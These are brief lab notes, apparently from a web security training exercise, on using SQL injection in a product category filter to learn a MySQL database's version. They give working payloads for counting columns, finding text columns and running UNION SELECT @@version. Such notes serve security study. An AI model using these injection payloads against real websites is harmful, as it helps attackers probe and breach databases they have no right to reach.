Lab 08 - SQL injection attack, querying the database type and version on MySQL and Microsoft

SQL Injection - Product Category

End Goal - display the database version

Analysis:

(1) Find number of columns
' order by 3# -> internal server error

3 - 1 = 2

(2) Figure out which columns contain text 
' UNION SELECT 'a', 'a'#

(3) Output the version
' UNION SELECT @@version, NULL#
SELECT @@version 

8.0.23

script.py <url>


